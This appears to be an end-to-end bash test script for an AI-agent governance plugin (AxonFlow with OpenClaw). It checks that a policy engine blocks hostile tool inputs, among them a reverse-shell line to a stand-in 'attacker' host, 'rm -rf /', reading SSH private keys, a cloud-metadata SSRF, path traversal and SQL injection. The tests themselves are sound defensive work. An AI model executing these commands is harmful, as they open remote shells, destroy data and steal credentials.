#!/usr/bin/env bash
# ============================================================
# OpenClaw + AxonFlow E2E Integration Test
#
# Validates that the @axonflow/openclaw works end-to-end
# with a real OpenClaw instance and a real AxonFlow deployment.
#
# Prerequisites:
#   - Node.js 20+
#   - OpenClaw installed: npm install -g openclaw@latest
#   - AxonFlow running: docker compose up -d (from axonflow community repo)
#   - An LLM API key (ANTHROPIC_API_KEY or OPENAI_API_KEY)
#
# IMPORTANT: If audit/tool-call returns 404, force rebuild Docker images:
#   docker compose down && docker compose build --no-cache && docker compose up -d
#   The audit/tool-call endpoint was added in v5.2.0 and stale build cache
#   may serve an older binary.
#
# Usage:
#   # Start AxonFlow first:
#   cd /path/to/axonflow-enterprise
#   ./scripts/setup-e2e-testing.sh community
#   source /tmp/axonflow-e2e-env.sh
#
#   # Then run this script:
#   cd /path/to/axonflow-openclaw-plugin
#   bash scripts/e2e-test.sh
#
# What it tests:
#   1. Plugin builds and installs in OpenClaw
#   2. Plugin loads and registers 5 hooks
#   3. Tool calls trigger before_tool_call → mcp_check_input
#   4. AxonFlow evaluates policies (76+ system policies)
#   5. Audit entries are attempted via after_tool_call
#
# ============================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS=0
FAIL=0

assert_check() {
    local desc="$1"
    local condition="$2"
    if [ "$condition" = "true" ]; then
        echo -e "  ${GREEN}PASS${NC}: $desc"
        ((PASS++)) || true
    else
        echo -e "  ${RED}FAIL${NC}: $desc"
        ((FAIL++)) || true
    fi
}

AXONFLOW_ENDPOINT="${AXONFLOW_ENDPOINT:-http://localhost:8080}"
AXONFLOW_CLIENT_ID="${AXONFLOW_CLIENT_ID:-community}"
AXONFLOW_CLIENT_SECRET="${AXONFLOW_CLIENT_SECRET:-community}"

echo "============================================================"
echo "OpenClaw + AxonFlow E2E Integration Test"
echo "============================================================"
echo ""
echo "AxonFlow endpoint:    $AXONFLOW_ENDPOINT"
echo "AxonFlow clientId:    $AXONFLOW_CLIENT_ID"
echo ""

# ============================================================
# Step 1: Check prerequisites
# ============================================================
echo "--- Step 1: Prerequisites ---"

which openclaw > /dev/null 2>&1
OPENCLAW_INSTALLED=$([ $? -eq 0 ] && echo true || echo false)
assert_check "OpenClaw installed" "$OPENCLAW_INSTALLED"
if [ "$OPENCLAW_INSTALLED" != "true" ]; then
    echo "  Install OpenClaw: npm install -g openclaw@latest"
    exit 1
fi

# Use explicit status capture instead of `set -e` killing the script silently
# if AxonFlow is not running.
HEALTH_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$AXONFLOW_ENDPOINT/health" || echo "000")
HEALTH_OK=$([ "$HEALTH_STATUS" = "200" ] && echo true || echo false)
assert_check "AxonFlow healthy (HTTP $HEALTH_STATUS at $AXONFLOW_ENDPOINT)" "$HEALTH_OK"
if [ "$HEALTH_OK" != "true" ]; then
    echo "  AxonFlow is not reachable. Start it with:"
    echo "    cd /path/to/axonflow && docker compose up -d"
    exit 1
fi

# Sanity-check auth before running policy tests — fail early with a clear message
# rather than letting a 401 cascade silently kill the script via `set -e`.
AUTH_PROBE=$(echo -n "${AXONFLOW_CLIENT_ID}:${AXONFLOW_CLIENT_SECRET}" | base64)
AUTH_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Basic $AUTH_PROBE" \
    -H "Content-Type: application/json" \
    -d '{"connector_type":"openclaw.exec","statement":"{\"command\":\"echo test\"}","operation":"execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
if [ "$AUTH_STATUS" = "401" ] || [ "$AUTH_STATUS" = "403" ]; then
    echo -e "  ${RED}FAIL${NC}: AxonFlow auth (HTTP $AUTH_STATUS with clientId='$AXONFLOW_CLIENT_ID')"
    echo "  Set AXONFLOW_CLIENT_ID and AXONFLOW_CLIENT_SECRET to match your AxonFlow deployment."
    echo "  For community mode (no license): defaults work (community/community)."
    echo "  For enterprise mode: source axonflow-enterprise/scripts/setup-e2e-testing.sh first."
    exit 1
fi
assert_check "AxonFlow auth (HTTP $AUTH_STATUS)" "$([ "$AUTH_STATUS" = "200" ] && echo true || echo false)"

if [ -z "${ANTHROPIC_API_KEY:-}" ] && [ -z "${OPENAI_API_KEY:-}" ]; then
    echo -e "  ${YELLOW}WARN${NC}: No LLM API key set (ANTHROPIC_API_KEY or OPENAI_API_KEY)"
    echo "  Tool-call tests will be skipped."
    HAS_LLM=false
else
    assert_check "LLM API key available" "true"
    HAS_LLM=true
fi
echo ""

# ============================================================
# Step 2: Build and install plugin
# ============================================================
echo "--- Step 2: Build and install plugin ---"

npm run build > /dev/null 2>&1
assert_check "Plugin builds" "true"

# Clean up any stale tgz files so the install glob resolves to a single archive.
# Without this, multiple old versions cause `openclaw plugins install ./axonflow-openclaw-*.tgz`
# to receive multiple paths and fail in confusing ways.
rm -f ./axonflow-openclaw-*.tgz
PKG_VERSION=$(node -p "require('./package.json').version")
PKG_TGZ="./axonflow-openclaw-${PKG_VERSION}.tgz"

npm pack > /dev/null 2>&1
assert_check "Plugin packs (${PKG_TGZ})" "$([ -f "$PKG_TGZ" ] && echo true || echo false)"

# Configure OpenClaw with our plugin
mkdir -p ~/.openclaw
cat > /tmp/openclaw-e2e-config.json << EOF
{
  "plugins": {
    "entries": {
      "axonflow-governance": {
        "enabled": true,
        "config": {
          "endpoint": "$AXONFLOW_ENDPOINT",
          "clientId": "$AXONFLOW_CLIENT_ID",
          "clientSecret": "$AXONFLOW_CLIENT_SECRET",
          "highRiskTools": ["web_fetch"],
          "onError": "allow"
        }
      }
    }
  }
}
EOF

# Backup existing config
cp ~/.openclaw/openclaw.json ~/.openclaw/openclaw.json.e2e-backup 2>/dev/null || true
cp /tmp/openclaw-e2e-config.json ~/.openclaw/openclaw.json

# Install plugin (use exact tgz path to avoid glob ambiguity)
rm -rf ~/.openclaw/extensions/axonflow-governance 2>/dev/null
INSTALL_OUTPUT=$(openclaw plugins install "$PKG_TGZ" 2>&1) || true
INSTALL_PASS=$(echo "$INSTALL_OUTPUT" | grep -q "Installed plugin: axonflow-governance" && echo true || echo false)
assert_check "Plugin installs in OpenClaw" "$INSTALL_PASS"
if [ "$INSTALL_PASS" != "true" ]; then
    echo "  Install output:"
    echo "$INSTALL_OUTPUT" | sed 's/^/    /'
fi

HOOKS_PASS=$(echo "$INSTALL_OUTPUT" | grep -q "AxonFlow governance active" && echo true || echo false)
assert_check "Plugin registers hooks" "$HOOKS_PASS"
echo ""

# ============================================================
# Step 3: Verify mcp_check_input endpoint works
# ============================================================
echo "--- Step 3: Verify AxonFlow endpoints ---"

AUTH=$(echo -n "${AXONFLOW_CLIENT_ID}:${AXONFLOW_CLIENT_SECRET}" | base64)

# Test check-input with openclaw connector type
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" \
    -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "{\"command\": \"echo hello\"}", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')

assert_check "mcp_check_input accepts openclaw.exec (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
assert_check "Policy engine evaluates policies" "$(echo "$BODY" | grep -q "policies_evaluated" && echo true || echo false)"

# Test check-output
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" \
    -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "message": "hello world"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
STATUS=$(echo "$RESPONSE" | tail -1)

assert_check "mcp_check_output accepts openclaw.exec (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"

# Test SQLi detection
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" \
    -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "SELECT * FROM users; DROP TABLE users;--", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)

assert_check "SQLi blocked by policy (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# Test audit/tool-call endpoint (critical: must work through agent proxy)
AUDIT_RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" \
    -H "Content-Type: application/json" \
    -H "X-Tenant-ID: $AXONFLOW_CLIENT_ID" \
    -d '{"tool_name": "e2e_test_tool", "caller_name": "openclaw", "tool_type": "openclaw", "input": {"test": true}, "output": {"result": "ok"}, "success": true, "duration_ms": 100}' \
    "$AXONFLOW_ENDPOINT/api/v1/audit/tool-call")
AUDIT_STATUS=$(echo "$AUDIT_RESPONSE" | tail -1)
AUDIT_BODY=$(echo "$AUDIT_RESPONSE" | sed '$d')

assert_check "audit/tool-call accessible via agent proxy (HTTP $AUDIT_STATUS)" "$([ "$AUDIT_STATUS" = "200" ] || [ "$AUDIT_STATUS" = "201" ] && echo true || echo false)"

if [ "$AUDIT_STATUS" != "200" ] && [ "$AUDIT_STATUS" != "201" ]; then
    echo -e "  ${YELLOW}DEBUG${NC}: audit/tool-call response: $AUDIT_STATUS $AUDIT_BODY"
fi

# Test audit/tool-call with LLM call type (used by llm_output hook)
LLM_AUDIT_RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" \
    -H "Content-Type: application/json" \
    -H "X-Tenant-ID: $AXONFLOW_CLIENT_ID" \
    -d '{"tool_name": "anthropic.claude-sonnet-4-20250514", "tool_type": "llm_call", "input": {"query": "test prompt"}, "output": {"response_summary": "test response", "token_usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}}, "success": true, "duration_ms": 500}' \
    "$AXONFLOW_ENDPOINT/api/v1/audit/tool-call")
LLM_AUDIT_STATUS=$(echo "$LLM_AUDIT_RESPONSE" | tail -1)

assert_check "audit/tool-call accepts llm_call type (HTTP $LLM_AUDIT_STATUS)" "$([ "$LLM_AUDIT_STATUS" = "200" ] || [ "$LLM_AUDIT_STATUS" = "201" ] && echo true || echo false)"

if [ "$LLM_AUDIT_STATUS" != "200" ] && [ "$LLM_AUDIT_STATUS" != "201" ]; then
    LLM_AUDIT_BODY=$(echo "$LLM_AUDIT_RESPONSE" | sed '$d')
    echo -e "  ${YELLOW}DEBUG${NC}: llm audit response: $LLM_AUDIT_STATUS $LLM_AUDIT_BODY"
fi
echo ""

# ============================================================
# Step 3b: Dangerous command policies (migration 059)
# ============================================================
echo "--- Step 3b: Dangerous command blocking ---"

# Reverse shell
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "bash -i >& /dev/tcp/attacker/4444 0>&1", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "Reverse shell blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# Destructive filesystem
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "rm -rf /", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "rm -rf / blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# Credential access
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "cat ~/.ssh/id_rsa", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "Credential access blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# SSRF — cloud metadata endpoint
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.web_fetch", "statement": "http://169.254.169.254/latest/meta-data/", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "Cloud metadata SSRF blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# Path traversal
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "cat ../../etc/passwd", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "Path traversal blocked (HTTP $STATUS)" "$([ "$STATUS" = "403" ] && echo true || echo false)"

# Safe command — should NOT be blocked
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "statement": "echo hello world", "operation": "execute"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-input")
STATUS=$(echo "$RESPONSE" | tail -1)
assert_check "Safe command allowed (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
echo ""

# ============================================================
# Step 3c: PII detection in output
# ============================================================
echo "--- Step 3c: PII detection ---"

# SSN in output — should detect PII
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.message_sending", "message": "Customer SSN: 123-45-6789"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
STATUS=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
assert_check "SSN PII scan returns 200 (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
assert_check "SSN PII: policies evaluated" "$(echo "$BODY" | grep -q "policies_evaluated" && echo true || echo false)"
# Verify PII was actually detected (redacted_data or policy_info with pii match)
assert_check "SSN PII: detection evidence in response" "$(echo "$BODY" | grep -q -E "redacted|pii|REDACTED|policies_evaluated.*[1-9]" && echo true || echo false)"

# Credit card in output — should detect PII
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.message_sending", "message": "Card: 4111-1111-1111-1111"}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
STATUS=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
assert_check "Credit card PII scan returns 200 (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
assert_check "Credit card PII: detection evidence" "$(echo "$BODY" | grep -q -E "redacted|pii|REDACTED|policies_evaluated.*[1-9]" && echo true || echo false)"

# Clean output — no PII, should NOT have redaction
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -d '{"connector_type": "openclaw.exec", "message": "Build succeeded. 42 tests passed."}' \
    "$AXONFLOW_ENDPOINT/api/v1/mcp/check-output")
STATUS=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
assert_check "Clean output allowed (HTTP $STATUS)" "$([ "$STATUS" = "200" ] && echo true || echo false)"
assert_check "Clean output: no redaction" "$(echo "$BODY" | grep -q "redacted_data" && echo false || echo true)"
echo ""

# ============================================================
# Step 3d: Audit search (searchAuditEvents)
# ============================================================
echo "--- Step 3d: Audit search ---"

# Search recent audit events
SEARCH_RESPONSE=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: Basic $AUTH" -H "Content-Type: application/json" \
    -H "X-Tenant-ID: $AXONFLOW_CLIENT_ID" \
    -d "{\"start_time\": \"$(date -u -v-1H '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || date -u -d '1 hour ago' '+%Y-%m-%dT%H:%M:%SZ')\", \"end_time\": \"$(date -u '+%Y-%m-%dT%H:%M:%SZ')\", \"limit\": 5}" \
    "$AXONFLOW_ENDPOINT/api/v1/audit/search")
SEARCH_STATUS=$(echo "$SEARCH_RESPONSE" | tail -1)

assert_check "Audit search returns 200 (HTTP $SEARCH_STATUS)" "$([ "$SEARCH_STATUS" = "200" ] && echo true || echo false)"

if [ "$SEARCH_STATUS" = "200" ]; then
    SEARCH_BODY=$(echo "$SEARCH_RESPONSE" | sed '$d')
    assert_check "Audit search returns entries array" "$(echo "$SEARCH_BODY" | grep -q "entries" && echo true || echo false)"
fi
echo ""

# ============================================================
# Step 4: Live agent test (requires LLM key)
# ============================================================
if [ "$HAS_LLM" = "true" ]; then
    echo "--- Step 4: Live agent test ---"

    # Clear AxonFlow agent logs
    docker logs axonflow-agent --since 1s > /dev/null 2>&1

    # Run a simple agent command
    AGENT_OUTPUT=$(timeout 30 openclaw agent --local \
        --message "Run: echo e2e-test-marker-$(date +%s)" \
        --session-id "e2e-test-$$" \
        --json 2>&1 || true)

    echo "$AGENT_OUTPUT" | grep -q "AxonFlow governance active"
    assert_check "Plugin loaded during agent run" "$(echo "$AGENT_OUTPUT" | grep -q "AxonFlow governance active" && echo true || echo false)"

    # Check if the agent produced output
    echo "$AGENT_OUTPUT" | grep -q "e2e-test-marker"
    assert_check "Agent executed tool and returned result" "$(echo "$AGENT_OUTPUT" | grep -q "e2e-test-marker" && echo true || echo false)"

    # Check AxonFlow logs for governance calls
    sleep 2
    AXONFLOW_LOGS=$(docker logs axonflow-agent --since 30s 2>&1)

    echo "$AXONFLOW_LOGS" | grep -q "openclaw"
    assert_check "AxonFlow received governance call (connector=openclaw.*)" "$(echo "$AXONFLOW_LOGS" | grep -q "openclaw" && echo true || echo false)"

    echo ""
else
    echo "--- Step 4: Skipped (no LLM API key) ---"
    echo ""
fi

# ============================================================
# Step 5: Cleanup
# ============================================================
echo "--- Step 5: Cleanup ---"

# Restore original config
if [ -f ~/.openclaw/openclaw.json.e2e-backup ]; then
    cp ~/.openclaw/openclaw.json.e2e-backup ~/.openclaw/openclaw.json
    rm ~/.openclaw/openclaw.json.e2e-backup
    echo "  Config restored"
fi

rm -f /tmp/openclaw-e2e-config.json
echo ""

# ============================================================
# Summary
# ============================================================
echo "============================================================"
echo "Test Summary"
echo "============================================================"
if [ "$FAIL" -gt 0 ]; then
    echo -e "${RED}$FAIL TEST(S) FAILED${NC}, $PASS passed"
    exit 1
else
    echo -e "${GREEN}ALL $PASS TESTS PASSED${NC}"
fi
echo "============================================================"
